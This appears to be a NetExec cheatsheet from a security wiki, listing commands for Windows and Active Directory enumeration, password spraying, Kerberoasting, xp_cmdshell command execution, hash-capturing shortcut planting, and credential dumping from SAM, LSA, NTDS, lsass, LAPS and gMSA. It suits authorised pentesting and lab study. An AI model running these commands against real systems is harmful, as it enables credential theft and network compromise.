---
description: >-
  A cheatsheet for NetExec, a tool used for automating authentication,
  enumeration, and credential dumping across various network services.
---

# NetExec Cheatsheet

### Installation <a href="#bkmrk-installation" id="bkmrk-installation"></a>

{% code overflow="wrap" %}
```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```
{% endcode %}

## We Enumerate Domain Users and Export the Results

{% code overflow="wrap" %}
```bash
nxc smb dc01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --users-export users.txt
```
{% endcode %}

### Basic Usage <a href="#bkmrk-basic-usage" id="bkmrk-basic-usage"></a>

{% code overflow="wrap" %}
```bash
netexec <service> <target> -u <username> -p <password>
```
{% endcode %}

### Authentication <a href="#bkmrk-authentication" id="bkmrk-authentication"></a>

#### Null Authentication <a href="#bkmrk-null-authentication" id="bkmrk-null-authentication"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u '' -p ''
```
{% endcode %}

#### Guest Authentication <a href="#bkmrk-guest-authentication" id="bkmrk-guest-authentication"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u 'guest' -p ''
```
{% endcode %}

#### Local Authentication <a href="#bkmrk-local-authentication" id="bkmrk-local-authentication"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password --local-auth
```
{% endcode %}

#### Kerberos Authentication <a href="#bkmrk-kerberos-authenticat" id="bkmrk-kerberos-authenticat"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -k1netexec ldap target --use-kcache
```
{% endcode %}

#### SMB Signing <a href="#bkmrk-smb-signing" id="bkmrk-smb-signing"></a>

{% code overflow="wrap" %}
```bash
netexec smb target(s) --gen-relay-list relay.txt
```
{% endcode %}

### Enumeration <a href="#bkmrk-enumeration" id="bkmrk-enumeration"></a>

#### Basic Enumeration <a href="#bkmrk-basic-enumeration" id="bkmrk-basic-enumeration"></a>

{% code overflow="wrap" %}
```bash
netexec smb target
```
{% endcode %}

#### List Shares <a href="#bkmrk-list-shares" id="bkmrk-list-shares"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u '' -p '' --shares
netexec smb target -u username -p password --shares
```
{% endcode %}

#### List Usernames <a href="#bkmrk-list-usernames" id="bkmrk-list-usernames"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u '' -p '' --users
netexec smb target -u '' -p '' --rid-brute 10000
netexec smb target -u username -p password --users
```
{% endcode %}

#### Spraying <a href="#bkmrk-spraying" id="bkmrk-spraying"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u users.txt -p password --continue-on-success
netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
netexec ssh target -u username -p password --continue-on-success
```
{% endcode %}

### Service-Specific <a href="#bkmrk-service-specific" id="bkmrk-service-specific"></a>

#### SMB <a href="#bkmrk-smb" id="bkmrk-smb"></a>

**All-in-One**

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```
{% endcode %}

**Extracting Files**

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```
{% endcode %}

**Spider\_plus Module**

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M spider_plus
netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
```
{% endcode %}

#### LDAP <a href="#bkmrk-ldap" id="bkmrk-ldap"></a>

**User Enumeration**

{% code overflow="wrap" %}
```bash
netexec ldap target -u '' -p '' --users
```
{% endcode %}

**All-in-One**

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password --trusted-for-delegation --password-not-required --admin-count --users --groups
```
{% endcode %}

**Kerberoasting & ASREProast**

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password --kerberoasting hash.txt
netexec ldap target -u username -p password --asreproast hash.txt
```
{% endcode %}

**BloodHound**

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password --bloodhound --dns-server ip --dns-tcp -c all
```
{% endcode %}

**LDAP signing**

Checks whether LDAP signing and binding are required and/or enforced

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password -M ldap-checker
```
{% endcode %}

**ADCS Enumeration**

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password -M adcs
```
{% endcode %}

**MachineAccountQuota**

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password -M maq
```
{% endcode %}

**Pre-Created Computer Accounts**

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password -M pre2k
```
{% endcode %}

**Find Misconfigured Delegation**

{% code overflow="wrap" %}
```bash
nxc ldap target -u username -p password --find-delegation
```
{% endcode %}

#### MSSQL <a href="#bkmrk-mssql" id="bkmrk-mssql"></a>

**Authentication**

{% code overflow="wrap" %}
```bash
netexec mssql target -u username -p password
```
{% endcode %}

**Executing Commands via xp\_cmdshell**

{% code overflow="wrap" %}
```bash
netexec mssql target -u username -p password -x command_to_execute
```
{% endcode %}

**Extracting Files**

{% code overflow="wrap" %}
```bash
netexec mssql target -u username -p password --get-file output_file target_file
```
{% endcode %}

#### FTP <a href="#bkmrk-ftp" id="bkmrk-ftp"></a>

**List Files & Directories**

{% code overflow="wrap" %}
```bash
netexec ftp target -u username -p password --ls
netexec ftp target -u username -p password --ls folder_name
```
{% endcode %}

**Retrieve a File**

{% code overflow="wrap" %}
```bash
netexec ftp target -u username -p password --ls folder_name --get file_name
```
{% endcode %}

### Credential Dumping <a href="#bkmrk-credential-dumping" id="bkmrk-credential-dumping"></a>

#### Secrets Dump <a href="#bkmrk-secrets-dump" id="bkmrk-secrets-dump"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password --lsa
netexec smb target -u username -p password --sam
```
{% endcode %}

#### NTDS <a href="#bkmrk-ntds" id="bkmrk-ntds"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password --ntds
netexec smb target -u username -p password -M ntdsutil
```
{% endcode %}

#### DPAPI <a href="#bkmrk-dpapi" id="bkmrk-dpapi"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password --dpapi
```
{% endcode %}

#### lsass <a href="#bkmrk-lsass" id="bkmrk-lsass"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M lsassy
```
{% endcode %}

#### LAPS <a href="#bkmrk-laps" id="bkmrk-laps"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password --laps
```
{% endcode %}

#### gMSA <a href="#bkmrk-gmsa" id="bkmrk-gmsa"></a>

{% code overflow="wrap" %}
```bash
netexec ldap target -u username -p password --gmsa
netexec ldap target -u username -p password --gmsa-convert-id id
netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
```
{% endcode %}

#### Group Policy Preferences <a href="#bkmrk-group-policy-prefere" id="bkmrk-group-policy-prefere"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M gpp_password
```
{% endcode %}

#### Retrieve MSOL account password <a href="#bkmrk-retrieve-msol-accoun" id="bkmrk-retrieve-msol-accoun"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M msol
```
{% endcode %}

#### Chaining Arguments <a href="#bkmrk-chaining-arguments" id="bkmrk-chaining-arguments"></a>

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password --sam --lsa --dpapi
```
{% endcode %}

### Vulnerabilities <a href="#bkmrk-vulnerabilities" id="bkmrk-vulnerabilities"></a>

Check if the DC is vulnerable to zerologon, petitpotam, nopac

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M zerologon
netexec smb target -u username -p password -M petitpotam
netexec smb target -u username -p password -M nopac
```
{% endcode %}

### Useful Modules <a href="#bkmrk-useful-modules" id="bkmrk-useful-modules"></a>

#### Webdav <a href="#bkmrk-webdav" id="bkmrk-webdav"></a>

Checks whether the WebClient service is running on the target

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M webdav
```
{% endcode %}

#### Veeam <a href="#bkmrk-veeam" id="bkmrk-veeam"></a>

Extracts credentials from local Veeam SQL Database

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M veeam
```
{% endcode %}

#### slinky <a href="#bkmrk-slinky" id="bkmrk-slinky"></a>

Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M slinky
```
{% endcode %}

#### coerce\_plus <a href="#bkmrk-coerce_plus" id="bkmrk-coerce_plus"></a>

Check if the Target is vulnerable to any coerce vulns (PetitPotam, DFSCoerce, MSEven, ShadowCoerce and PrinterBug)

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M coerce_plus -o LISTENER=tun0_ip
```
{% endcode %}

#### enum\_av <a href="#bkmrk-enum_av" id="bkmrk-enum_av"></a>

Gathers information on all endpoint protection solutions installed on the the remote host

{% code overflow="wrap" %}
```bash
netexec smb target -u username -p password -M enum_av
```
{% endcode %}

